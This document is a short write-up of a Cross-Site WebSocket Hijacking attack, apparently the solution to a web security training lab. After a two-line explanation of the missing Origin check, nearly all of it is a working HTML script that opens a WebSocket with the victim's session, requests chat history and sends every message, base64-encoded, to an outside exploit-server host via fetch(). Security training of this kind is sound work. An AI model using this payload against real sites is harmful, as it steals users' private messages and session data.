# Cross-Site WebSocket Hijacking
# The application accepts authenticated WebSocket connections without properly validating the Origin header. This allows an external site to establish WebSocket connections using the victim's authenticated session.

<script>
    var ws = new WebSocket("https://0a7000180406b9f081a4d47f00e0003c.web-security-academy.net/chat");

    ws.onopen = function() {
      ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch("https://exploit-0a760092047db9b98125d3f8013600b9.exploit-server.net/?data=" + btoa(event.data));
    };
</script>



